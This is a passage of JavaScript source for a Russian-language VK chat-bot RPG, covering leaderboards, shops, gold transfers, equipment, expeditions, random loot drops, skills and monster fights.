		for (var g = 0; g < 10; g++) {
			if (tops.length > g) {
				let ups = g;
				ups += 1;
				if(g <= 8) ups = `${ups}&#8419;`
				if(g == 9) ups = `&#128287;`
				yo.push({
					id: tops[g].id,
					idvk: tops[g].idvk,
					lvl: tops[g].lvl,
          die: tops[g].die,
					smile: `${ups}`
				})
			}
		}
		var people = "🌐 Топ PVE игроков 💀 \n" + yo.map(a => a.smile + ". [id" + a.idvk + "|" + rpg.users[a.id].prefix + "] - " + spaces(a.lvl) + " убийств | " + spaces(a.die) + " смертей |" + " ⚔ Сила: " + rpg.users[a.id].damage).join("\n")
		text += `${people}\n\n`;
		context.send(text);
	});

	vk.updates.hear(/^(?:!топ)/i,  (context) => {

		let text = ``;
		var tops = []
		for (i=2;i<200000;i++) {
		if(rpg.users[i]){
			tops.push({
				id: i,
				idvk: rpg.users[i].id,
				lvl: rpg.users[i].damage
			})

		}

		}
		tops.sort(function(a, b) {
			if (b.lvl > a.lvl) return 1
			if (b.lvl < a.lvl) return -1
			return 0
		})
		var yo = []

		for (var g = 0; g < 10; g++) {
			if (tops.length > g) {
				let ups = g;
				ups += 1;
				if(g <= 8) ups = `${ups}&#8419;`
				if(g == 9) ups = `&#128287;`
				yo.push({
					id: tops[g].id,
					idvk: tops[g].idvk,
					lvl: tops[g].lvl,
					smile: `${ups}`
				})
			}
		}
		var people = "🌐 Топ игроков Wild RPG 💠 \n" + yo.map(a => a.smile + ". [id" + a.idvk + "|" + rpg.users[a.id].prefix + "] - " + spaces(a.lvl) + " DMG ⚔ |" + " ❤ HP: " + rpg.users[a.id].hp).join("\n")
		text += `${people}\n\n`;
		context.send(text);
	});

	vk.updates.hear(/^(?:!авантюристы|!авант)/i,  (context) => {

		let text = ``;
		var tops = []
		for (i=2;i<200000;i++) {
		if(rpg.users[i]){
			tops.push({
				id: i,
				idvk: rpg.users[i].id,
				lvl: rpg.users[i].rang
			})

		}

		}
		tops.sort(function(a, b) {
			if (b.lvl > a.lvl) return 1
			if (b.lvl < a.lvl) return -1
			return 0
		})
		var yo = []

		for (var g = 0; g < 10; g++) {
			if (tops.length > g) {
				let ups = g;
				ups += 1;
				if(g <= 8) ups = `${ups}&#8419;`
				if(g == 9) ups = `&#128287;`
				yo.push({
					id: tops[g].id,
					idvk: tops[g].idvk,
					lvl: tops[g].lvl,
					smile: `${ups}`
				})
			}
		}
		var people = "🌐 Топ авантюристов Wild RPG ⭐ \n" + yo.map(a => a.smile + ". [id" + a.idvk + "|" + rpg.users[a.id].prefix + "] - " + " 💠 Ранг: " + a.lvl.toString().replace(/1/gi, "Фарфоровый").replace(/2/gi, "Обсидиановый ").replace(/3/gi, "Стальной ").replace(/4/gi, "Сапфировый ").replace(/5/gi, "Изумрудный ").replace(/5/gi, "Рубиновый  ").replace(/5/gi, "Бронзовый  ").replace(/5/gi, "Серебряный  ").replace(/5/gi, "Золотой  ").replace(/10/gi, "Платиновый  ")).join("\n")
		text += `${people}\n\n`;
		context.send(text);
	});

vk.updates.hear(/^(?:!таверна)\s?([0-9]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	let user = rpg.users[user_id(context.user)];
	let wlvl = rand(1,user.lvl);
	let i = context.$match[1];
	if(!i) return context.send(`${weapon_stats(user)}`);
	if(!weapons[i]) return context.send(`Данного предмета нет в таверне!`)
	if(user.inv_slots == user.items) return context.send(`Нет места в инвентаре!`)
	if(user.gold < weapons[i].price) return context.send(`У Вас недостаточно золота!`)
	user.gold -= weapons[i].price
		if(user.gold < 0) return context.send(`Произошла ошибка! Обратитесь в "репорт"!`)
		user.inventory[user.inv_empty] = {
			name: weapons[i].name,
			id: user.inv_empty,
			level: wlvl,
			itemtype: 'Оружие',
			itemtype_n: 1,
			count: weapons[i].count * wlvl,
			rarity: 'Обычный',
			class: weapons[i].class,
			price: weapons[i].price / 4
	}
	user.items += 1;
	user.inv_empty += 1;
	return context.send(`Вы успешно приобрели ${weapons[i].name} за ${spaces(weapons[i].price)} 💰`)
});

vk.updates.hear(/^(?:!рынок)\s?([0-9]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1];
	/*if(!i) return context.send(`🔸 ➾ На рынке всего одна маленькая лавка.\n🔸 ➾ Продавец предлагает Вам:\n🔸 ➾ Свитки | 1 шт. за 20.000 золота\n🔸 ➾ Для покупки введите "!рынок [кол-во]"`);*/
	if(!i) return context.send(`🔸 ➾ На рынке всего одна маленькая лавка.\n🔸 ➾ Продавец предлагает Вам:\n🔸 ➾ Бриллианты | 1 шт. за 10.000.000 золота\n🔸 ➾ Для покупки введите "!рынок [кол-во]"`);
	if(user.inv_slots == user.items) return context.send(`🔸 ➾ Нет места в инвентаре!`)
	if(user.gold < 10000000*i) return context.send(`🔸 ➾ У Вас недостаточно золота!`)
	user.gold -= 10000000 * i
    if(user.gold < 0) return context.send(`Произошла ошибка! Обратитесь в "репорт"!`)
	user.diamond += Number(i);
	return context.send(`Вы успешно приобрели ${i} Бриллиантов за ${spaces(10000000*i)} 💰`)
});

vk.updates.hear(/^(?:!передать|!перевод)\s?([0-9]+)?\s?([0-9]+)?/i, (context) => {
	let id = user_id(context.user)
    let user = rpg.users[user_id(context.user)];
	if(!context.$match[1] || !context.$match[2]) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n👉 ➾ Пример команды: !перевод ID СУММА`)
    if(!user.limits.pay) user.limits.pay = false
	if(user.level < 1){
	if(user.limits.pay == true) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n🔸 ➾ Передавать золото можно раз в 10 минут.`)
		if(context.$match[2] > 10000) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n💴 ➾ Максимальная сумма передачи 10.000 золота\n👑 ➾ У VIP лимит передачи увеличен.`)
	}
	if(user.level == 1){
	if(user.limits.pay == true) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n🔸 ➾ Передавать золото можно раз в 5 минут.`)
		if(context.$match[2] > 50000) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n💴 ➾ Максимальная сумма передачи 50.000 золота`)
	}
	if(user.level == 2){
		user.limits.pay = false;
	if(user.limits.pay == true) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n🔸 ➾ Передавать золото можно раз в 2 минуты.`)
		if(context.$match[2] > 500000) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n💴 ➾ Максимальная сумма передачи 500.000 золота`)
	}
	let ids = context.$match[1]
	if(!Number(context.$match[1]) || !Number(context.$match[2])) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n👉 ➾ ID и СУММА должны быть числового вида.`)
	if(!rpg.users[context.$match[1]] || context.$match[2] < 0) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n👉 ➾ Некорректно введены данные`)
	if(context.$match[2] > user.gold) return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n👉 ➾ У вас нет столько золота`);
	user.gold -= Number(context.$match[2]);
	rpg.users[context.$match[1]].gold += Number(context.$match[2]);

 	user.limits.pay = true;
		if(user.level < 1){
		setTimeout(() => {
			user.limits.pay = false;
	}, 360000);
		}
		if(user.level >= 1){
		setTimeout(() => {
			user.limits.pay = false;
	}, 180000);
		}
		if(user.level == 2){
		setTimeout(() => {
			user.limits.pay = false;
	}, 1000);
		}
	api.messages.send({
		peer_id: rpg.users[context.$match[1]].id,
		message: `@id${rpg.users[context.$match[1]].id}(${rpg.users[context.$match[1]].prefix}),\n💴 ➾ Игрок [ID: ${id}] @id${user.id} (${user.prefix}) перевел вам ${spaces(context.$match[2])} золота`
	}).then((res) => {}).catch((error) => {console.log('pay error'); });
	return context.send(`@id${rpg.users[id].id}(${rpg.users[id].prefix}),\n💴 ➾ Вы успешно перевели @id${rpg.users[context.$match[1]].id} (${rpg.users[context.$match[1]].prefix}) -> ${context.$match[2]} золота\n👑 ➾ Оставшийся баланс: ${spaces(user.gold)} золота`);
});

vk.updates.hear(/^(?:!продать)\s?([0-9]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	let user = rpg.users[user_id(context.user)];
	let wlvl = rand(1,user.level);
	let i = context.$match[1];
	if(user.inventory[i] == null ) return context.send(`❌ Нет предмета в инвентаре!`)
    if(i == user.weaponwear ) return context.send(`❌ Данный предмет находится в Вашем снаряжении!`)
	user.gold += user.inventory[i].price
	let name = user.inventory[i].name
	let price = user.inventory[i].price
	delete user.inventory[i]
	user.items -= 1
		if(user.gold < 0) return context.send(`❌ Произошла ошибка! Обратитесь в "репорт"!`)
	return context.send(`🚮 Вы успешно продали ${name} за ${spaces(price)} 💰`)
});

vk.updates.hear(/^(?:!оружие)\s?([0-9]+)?/i, (context) => {
	if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1];
	let inven = user.inventory[i];
	if(!i) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❔ Укажите id`)
	if(!user.inventory[i]) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Данного оружия нет в Вашем инвентаре!`)
	if(user.inventory[i].class != user.class) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Данное оружие не подходит Вашему классу!`)
    if(user.lvl < user.inventory[i].level) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Данное оружие не подходит Вам по уровню!`)
	if(user.inventory[i].itemtype != "Оружие") return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Предмет не является оружием!`)
		if(i == 0){
			if(user.weaponwear != false){
			delete user.weapon[user.weaponwear]
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n✅ Вы сняли оружие!`)
			}
			if(user.weaponwear == false){
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Вы не снаряжены оружием!`)
			}
		}
		if(user.weaponwear != false){
		delete user.weapon[user.weaponwear]
    }
		user.weaponwear = Number(i);
	user.weapon[i] = {
		name: inven.name,
		id: inven.id,
		level: inven.lvl,
		count: inven.count,
		rarity: inven.rarity,
		class: inven.class,
		price: inven.price
	}
	user.weaponwear = Number(i);
	return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n✅ Вы успешно снарядили ${inven.name}`)
});

vk.updates.hear(/^(?:!броня)\s?([0-9]+)?/i, (context) => {
	if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1];
	let inven = user.inventory[i];
	if(!user.setwear) user.setwear = false
	if(!user.set) user.set = {};
	if(!i) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❔ Укажите id`)
	if(!user.inventory[i]) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Данного сета нет в Вашем инвентаре!`)
	if(user.inventory[i].class != user.class && user.inventory[i].class != "Любой") return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Данный сет не подходит Вашему классу!`)
    if(user.lvl < user.inventory[i].level) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Данный сет не подходит Вам по уровню!`)
	if(user.inventory[i].itemtype != "Сет") return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Предмет не является броней!`)
		if(i == 0){
			if(user.setwear != false){
			delete user.weapon[user.setwear]
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n✅ Вы сняли броню!`)
			}
			if(user.setwear == false){
			return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n❌ Вы не снаряжены броней!`)
			}
		}
		if(user.setwear != false){
		delete user.weapon[user.setwear]
    }
		user.setwear = Number(i);
	user.set[i] = {
		name: inven.name,
		id: inven.id,
		level: inven.lvl,
		count: inven.count,
		rarity: inven.rarity,
		class: inven.class,
		price: inven.price
	}
	user.setwear = Number(i);
	return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n✅ Вы успешно снарядили ${inven.name}`)
});

	vk.updates.hear(/^(?:!экспедиция|!эксп)/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
		if(user.limits.travel == true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n📛 До конца экспедиции ${user.traveltime} минут(а/ы)`)
			user.limits.travel = true;
            user.chat = context.chatId
		if(rpg.users[user_id(context.user)].level < 1){
            user.traveltime = 60
		}
		if(rpg.users[user_id(context.user)].level == 1){
            user.traveltime = 30
		}
		if(rpg.users[user_id(context.user)].level == 2){
            user.traveltime = 20

		}
		if(rpg.users[user_id(context.user)].level == 3){
            user.traveltime = 5

		}
        return context.send(`⏩ Вы отправили героя в экспедицию.\n⏩ Через ${user.traveltime} минут он вернется с находками.\n`);
 	});

function item_drop(user){
	let text = '';
		let wlvl = rand(1,user.level+5);
    let itemtype_n = rand(1,2)
		let rare_n = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 3, 3, 4].random();
			if(rare_n == 4){
				let mega = rand(1,10)
					if(mega == 7){
						rare_n = 5
					}
			}
    let rare = rare_n.toString().replace(/1/gi, "Обычный").replace(/2/gi, "Редкий").replace(/3/gi, "Эпический").replace(/4/gi, "Легендарный").replace(/5/gi, "Мифический");
    let itemtype = itemtype_n.toString().replace(/1/, "Оружие").replace(/2/, "Сет").replace(/3/, "Зелье").replace(/4/, "Артефакт")
                    if(itemtype_n == 1){
					let i = rand(1,weapons.weaps)
					let w = weapons[i];
					if(rare == "Мифический"){
		user.inventory[user.inv_empty] = {
			name: weapons[i].name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: weapons[i].count + wlvl + 2,
			rarity: rare,
			class: weapons[i].class,
			price: weapons[i].price * 5
	}
		};
					if(rare == "Легендарный"){
		user.inventory[user.inv_empty] = {
			name: weapons[i].name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: weapons[i].count + wlvl + 1,
			rarity: rare,
			class: weapons[i].class,
			price: weapons[i].price * 2
	}
		};
		if(rare == "Эпический"){
		user.inventory[user.inv_empty] = {
			name: weapons[i].name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: weapons[i].count + wlvl,
			rarity: rare,
			class: weapons[i].class,
			price: weapons[i].price
	}
		};
		if(rare == "Редкий"){
		user.inventory[user.inv_empty] = {
			name: weapons[i].name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: weapons[i].count + wlvl,
			rarity: rare,
			class: weapons[i].class,
			price: weapons[i].price / 2
	}
		};
		if(rare == "Обычный"){
	user.inventory[user.inv_empty] = {
		name: weapons[i].name,
		id: user.inv_empty,
		itemtype: itemtype,
			itemtype_n: itemtype_n,
		level: wlvl,
		count: weapons[i].count + wlvl,
		rarity: rare,
		class: weapons[i].class,
		price: weapons[i].price / 4
	}
		};
		user.items += 1;
		user.inv_empty += 1;
        text += `⏩ @id${user.id}(${user.prefix})\n`
		text += `Вы нашли предмет:\n• ${w.name}\n&#4448;• 🔱 Редкость: ${rare}\n&#4448;• 💡 Уровень: ${wlvl}\n&#4448;• 🔗 Тип: ${itemtype}\n&#4448;• ⚔ Урон: ${user.inventory[user.inv_empty-1].count}\n&#4448;• 👥 Класс: ${user.inventory[user.inv_empty-1].class}\n&#4448;• 💰 Цена: ${user.inventory[user.inv_empty-1].price}`
                        if(user.chat == null){
                           api.messages.send({
                            peer_id: user.id,
                            message: text
                    });
                        }
                        if(user.chat != null){
                        api.messages.send({
                            peer_id: 2000000000 + user.chat,
                            message: text
                    }).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
                        }
        };
if(itemtype_n == 2){
			let i = rand(1,sets.items)
					let h = sets[i];
					if(rare == "Мифический"){
		user.inventory[user.inv_empty] = {
			name: h.name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: h.count + wlvl + 2,
			rarity: rare,
			class: h.class,
			price: h.price * 5
	}
		};
					if(rare == "Легендарный"){
		user.inventory[user.inv_empty] = {
			name: h.name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: h.count + wlvl + 1,
			rarity: rare,
			class: h.class,
			price: h.price * 2
	}
		};
		if(rare == "Эпический"){
		user.inventory[user.inv_empty] = {
			name: h.name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: h.count + wlvl,
			rarity: rare,
			class: h.class,
			price: h.price
	}
		};
		if(rare == "Редкий"){
		user.inventory[user.inv_empty] = {
			name: h.name,
			id: user.inv_empty,
			itemtype: itemtype,
			itemtype_n: itemtype_n,
			level: wlvl,
			count: h.count + wlvl,
			rarity: rare,
			class: h.class,
			price: h.price / 2
	}
		};
		if(rare == "Обычный"){
	user.inventory[user.inv_empty] = {
		name: h.name,
		id: user.inv_empty,
		itemtype: itemtype,
		itemtype_n: itemtype_n,
		level: wlvl,
		count: h.count + wlvl,
		rarity: rare,
		class: h.class,
		price: h.price / 4
	}
		};
		user.items += 1;
		user.inv_empty += 1;
        text += `⏩ @id${user.id}(${user.prefix})\n`
		text += `Вы нашли предмет:\n• ${h.name}\n&#4448;• 🔱 Редкость: ${rare}\n&#4448;• 💡 Уровень: ${wlvl}\n&#4448;• 🔗 Тип: ${itemtype}\n&#4448;• 🛡 Защита: ${user.inventory[user.inv_empty-1].count}\n&#4448;• 👥 Класс: ${user.inventory[user.inv_empty-1].class}\n&#4448;• 💰 Цена: ${user.inventory[user.inv_empty-1].price}`
                        if(user.chat == null){
                           api.messages.send({
                            peer_id: user.id,
                            message: text
                    });
                        }
                        if(user.chat != null){
                        api.messages.send({
                            peer_id: 2000000000 + user.chat,
                            message: text
                    }).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
                        }
};
if(itemtype_n == 3){
			api.messages.send({
				peer_id: user.id,
				message: `Tested Item ID 3\n&#4448;• 🔗 Тип: ${itemtype}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
}
if(itemtype_n == 4){
			api.messages.send({
				peer_id: user.id,
				message: `Tested Item ID 4\n&#4448;• 🔗 Тип: ${itemtype}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
}
if(itemtype_n == 5){
			api.messages.send({
				peer_id: user.id,
				message: `Tested Item ID 5\n&#4448;• 🔗 Тип: ${itemtype}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
}
if(itemtype_n == 6){
			api.messages.send({
				peer_id: user.id,
				message: `Tested Item ID 6\n&#4448;• 🔗 Тип: ${itemtype}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
}
if(itemtype_n == 7){
			api.messages.send({
				peer_id: user.id,
				message: `Tested Item ID 7\n&#4448;• 🔗 Тип: ${itemtype}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом предмете в лс'); });
}
}

	vk.updates.hear(/^(?:!навык|💥 Навык)\s?([0-9]+)?/i, (context) => {
		return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n📛 Баланс рухнул, кажется, в этом мире почти не осталось магии...`);
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let i = Number(context.$match[1])
		let user = rpg.users[user_id(context.user)];
		if(user.lvl < 3) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n📛 Выбор навыка доступен с 3 уровня!`);
		if(i< 0 || i > 7) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n📛 Неверный ID навыка.`);
		if(i){
			if(!user.skill){
				user.skill.id = Number(i)
				user.skill.name = skills[String(i)].name,
				user.skill.type = skills[String(i)].type,
				user.skill.time = skills[String(i)].time,
				user.skill.count = skills[String(i)].count
                user.skill.level = 1
				uplvl(user);
				return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n
				🔯 Вы выбрали навык:
				⏩ ${skills[String(i)].name}
				❌ Повторная смена навыка стоит 20 бриллиантов.
				`);
			}else{
				if(user.diamond < 20) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n📛 Смена навыка стоит 20 бриллиантов`);
				user.skill.id = Number(i)
				user.skill.name = skills[String(i)].name,
				user.skill.type = skills[String(i)].type,
				user.skill.time = skills[String(i)].time,
				user.skill.count = skills[String(i)].count
                user.skill.level = 1
				uplvl(user);
				return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}),\n
				🔯 Вы выбрали навык:
				⏩ ${skills[String(i)].name}
				- - - - -
				❌ Повторная смена навыка стоит 20 бриллиантов.
				`);
			}


		}else{
			return context.send({
								message: `${text_skill()}
										⏩ Для выбора навыка напишите:
										⏩ "!навык ID"`,
								keyboard: Keyboard.keyboard([
							 [
									Keyboard.textButton({
									label: '💥 Навык 1',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '💥 Навык 2',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '💥 Навык 3',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '💥 Навык 4',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '💥 Навык 5',
									color: Keyboard.POSITIVE_COLOR,
									})
							],
							[
									Keyboard.textButton({
									label: '💥 Навык 6',
									color: Keyboard.POSITIVE_COLOR,
									})
							]
							])
							.inline(true)
									})
		}
	});

const skills = {
	'1': {
		name: 'Тактический расчет',
		text: 'Увеличение физического урона на 30 минут (x1.1)',
		type: 'Поддержка',
		time: 15,
		count: 1.1
	},
	'2': {
		name: 'Концентрация',
		text: 'Увеличение обороны на 30 минут (x1.1)',
		type: 'Поддержка',
		time: 15,
		count: 1.1
	},
	'3': {
		name: 'Исцеление',
		text: 'Мгновенно лечит вас (20💙 / 1 уровень)',
		type: 'Поддержка',
		time: 15,
		count: 20
	},
	'4': {
		name: 'Барьер',
		text: 'Увеличение обороны (разово x2)',
		type: 'Поддержка',
		time: 5,
		count: 2
	},
	'5': {
		name: 'Сокрушающий удар',
		text: 'Мгновенный урон (1 урон / 1 уровень)',
		type: 'Урон',
		time: 1,
		count: 1
	},
	'6': {
		name: 'Испепеление',
		text: 'Мгновенный урон (3 урона / 1 уровень)',
		type: 'Урон',
		time: 3,
		count: 3
	}
}

function text_skill(){
	let text = '';
	for(i=1;i<7;i++){
		var s = skills[i];
		text += `${i}. ⏩ Навык: ${s.name}
		&#4448;• 📜 Описание: ${s.text}
		&#4448;• 🎗 Тип: ${s.type}
		&#4448;• ⏳ Перезарядка: ${s.time} минут

		`
	}
	return text
}

vk.updates.hear(/^(?:!костоклад)\s?([а-яa-z]+)?/i, (context) => {
	if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1];
	let bone = world.bonehoard
	let text = ``
	if(!i) return context.send(`
	🦴 Костоклад | 📶 Lvl ${world.bonehoard.level} | ${bone.exp} / 10 |
	❤ Здоровье: ${world.bonehoard.hp}
	⚔ Для атаки введи "!костоклад атака"
	📒 Последние 10 атак "!костоклад лог"
	⭐ Топ 10 сильнейших атак "!костоклад топ"
	`)
	if(i == "атака"){
		let dmg = user.damage
		let bonehp = bone.hp
		let fight = bonehp - dmg
		if(fight > 0){
			text += `• Вы нанесли Костокладу ${dmg} урона\n• ❤ Оставшееся здоровье ${fight}\n• ⚡ Костоклад регенерировал!`
		}
		if(fight <= 0){
			text += `• Вы нанесли Костокладу ${dmg} урона\n• 🖤 Последние части Костоклада обращаются в прах\n• 🔱 На месте его смерти Вы находите: Ядро Костоклада!`
			user.bonecore++
		}
		return context.send(text)
	}
});

	vk.updates.hear(/^(?:!pve|!пве|⚔ PVE)\s?([0-9]+)?/i, (context) => {
		if(rpg.users[user_id(context.user)].registered != true) return context.send(`@id${context.user} (${rpg.users[user_id(context.user)].prefix}), Вы не зарегистрированы! Введите "!создать"`);
		let user = rpg.users[user_id(context.user)];
        let text = ``;
		let id = rand(1,mobs.number);
        let level = rand(user.lvl, user.lvl + 1)
		let i = rand(1,mobs.number)
		text = ``
		let mobz = []
		for(i in mobs){
			if(mobs[i].element == world.element){
				mobz.push(i)
			}
		}
		let rnd = mobz.random()
		id = rnd
    let mob = mobs[id];
		if(!mobs[id]) return context.send(`Не удалось найти мобов в мире..`)
		if(mobs[id].element != world.element) return context.send(`Не удалось найти мобов в мире..`)
        let def = Math.round(user.defence / 2)
			if(user.temp.hp == 0){
				user.temp.hp = user.hp + def;
			}
			if(user.temp.damage == 0){
			user.temp.damage = user.damage;
			}
		if(context.isChat == false){
		if(user.enemyid != false) return context.send({
			message: `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),
			• ⚔ Ваш противник:
			&#4448;• 🎭 ${user.enemy.name} | ${user.enemy.level} lvl
			&#4448;&#4448;• ⚔ Урон: ${user.enemy.damage}
			&#4448;&#4448;• ❤ HP: ${user.enemy.hp}
			&#4448;&#4448;• 🔗 Тип: ${user.enemy.type.toString().replace(/1/gi, "Эльдрази").replace(/2/gi, "Человек").replace(/3/gi, "Эльф").replace(/4/gi, "Зверь").replace(/5/gi, "Элементаль").replace(/6/gi, "Насекомое").replace(/7/gi, "Вурм").replace(/8/gi, "Паук").replace(/9/gi, "Драконы")}
			&#4448;&#4448;• 🌟 Элемент: ${user.enemy.element.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")}
			&#4448;&#4448;• 📖 Данные из бестиария:
			&#4448;• ${mobs[user.enemy.id].description}
			\n• ⚔ Ваша статистика:
			&#4448;• 👥 @id${context.user} (${rpg.users[user_id(context.user)].prefix}), ${user.class} | 🔰 ${user.lvl} lvl
			&#4448;&#4448;• ⚔ Урон: ${user.temp.damage}`+(user.weaponwear == false ? `` : ` + ${user.weapon[user.weaponwear].count}`)+`
			&#4448;&#4448;• ❤ HP: ${user.temp.hp}`+ (user.setwear == false ? `` : ` + ${user.set[user.setwear].count}`)+`
			&#4448;&#4448;• ⚜ Ранг: ${user.rang.toString().replace(/1/gi, "Фарфоровый").replace(/2/gi, "Обсидиановый ").replace(/3/gi, "Стальной ").replace(/4/gi, "Сапфировый ").replace(/5/gi, "Изумрудный ").replace(/5/gi, "Рубиновый  ").replace(/5/gi, "Бронзовый  ").replace(/5/gi, "Серебряный  ").replace(/5/gi, "Золотой  ").replace(/10/gi, "Платиновый  ")}
			🆚 Для проведения обычной атаки, введи "!атака"
			`,
			keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({
            label: '🗡 Ближний бой',
            color: Keyboard.NEGATIVE_COLOR,
            })
	],
	[
            Keyboard.textButton({
            label: '🔯 Способность',
            color: Keyboard.POSITIVE_COLOR,
            })
	]
	])
		})
	}
		if(context.isChat == true){
		if(user.enemyid != false){
		text += `@id${context.user} (${rpg.users[user_id(context.user)].prefix}),
		• ⚔ Ваш противник:\n
		`
		text += `
		&#4448;• 🎭 ${user.enemy.name} | ${user.enemy.level} lvl
		&#4448;&#4448;• ⚔ Урон: ${user.enemy.damage}
		&#4448;&#4448;• ❤ HP: ${user.enemy.hp}
		&#4448;&#4448;• 🔗 Тип: ${user.enemy.type.toString().replace(/1/gi, "Эльдрази").replace(/2/gi, "Человек").replace(/3/gi, "Эльф").replace(/4/gi, "Зверь").replace(/5/gi, "Элементаль").replace(/6/gi, "Насекомое").replace(/7/gi, "Вурм").replace(/8/gi, "Паук").replace(/9/gi, "Драконы")}
		&#4448;&#4448;• 🌟 Элемент: ${user.enemy.element.toString().replace(/0/gi, "Пустота").replace(/1/gi, "Свет").replace(/2/gi, "Вода").replace(/3/gi, "Тьма").replace(/4/gi, "Огонь").replace(/5/gi, "Земля")}
		&#4448;&#4448;• 📖 Данные из бестиария:
		&#4448;• ${mobs[user.enemy.id].description}
		`
		text += `\n• ⚔ Ваша статистика:`
		text += `
		&#4448;• 👥 @id${context.user} (${rpg.users[user_id(context.user)].prefix}), ${user.class} | 🔰 ${user.lvl} lvl
		&#4448;&#4448;• ⚔ Урон: ${user.temp.damage}`+(user.weaponwear == false ? `` : ` + ${user.weapon[user.weaponwear].count}`)+`
